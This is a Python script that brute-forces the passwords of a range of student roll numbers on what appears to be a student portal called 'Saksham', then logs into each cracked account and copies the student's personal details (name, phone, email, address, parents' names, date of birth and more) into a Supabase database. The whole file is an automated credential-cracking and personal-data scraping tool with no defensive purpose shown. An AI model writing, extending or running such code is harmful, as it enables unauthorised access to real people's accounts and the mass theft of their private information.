from database.supabase_student_database import *
from script.http_scripts import *
import time


def main():
    database = SupabaseStudentDatabase()

    for i in range(1203, 1300):

        formatted = '{0:04}'.format(i)
        userid = "2023/" + formatted

        try:
            if database.getStudentData(userid) is not None:
                print(f"{userid} password already exist in database/being cracked")
            else:
                print(f"{userid} password not found in database")

                # Working status set in database
                working_dict = {
                    "password": "working...",
                    "roll": userid,
                }
                database.addStudentData(userid, data=working_dict)

                start_time = time.perf_counter()

                print("Cracking...")
                password = bruteforceLogin(userid, 1000)
                end_time = time.perf_counter()
                elapsedTime = str(end_time - start_time)[:8]

                if password is None:

                    # null student set in database
                    null_dict = {
                        "roll": userid,
                        "time_taken": elapsedTime
                    }
                    database.addStudentData(userid, null_dict)

                else:
                    print("Password found: " + password)
                    student = getStudentDataFromSaksham(userid, password)
                    student_dict = {
                        "password": password,
                        "time_taken": elapsedTime,
                        "student_name": str(student.student_name.lower),
                        "phone": student.phone,
                        "category": student.category,
                        "email": student.email,
                        "roll": student.roll,
                        "address": student.address,
                        "father_name": str(student.father_name.lower),
                        "mother_name": str(student.mother_name.lower),
                        "dob": student.dob,
                        "gender": student.gender,
                        "student_id": student.student_id,
                        "session": student.session,
                        "enrollment_no": student.enrollment_no,
                        "admission_date": student.admission_date,
                        "student_type": student.student_type,
                    }
                    database.addStudentData(userid, student_dict)
                    print(f"{userid} data retrieved and added to database")

        except Exception as e:
            print(f"Error: {e}")


if __name__ == "__main__":
    main()

# Error: {'code': 'PGRST204', 'details': None, 'hint': None, 'message': "Could not find the 'timeTaken' column of 'student' in the schema cache"}
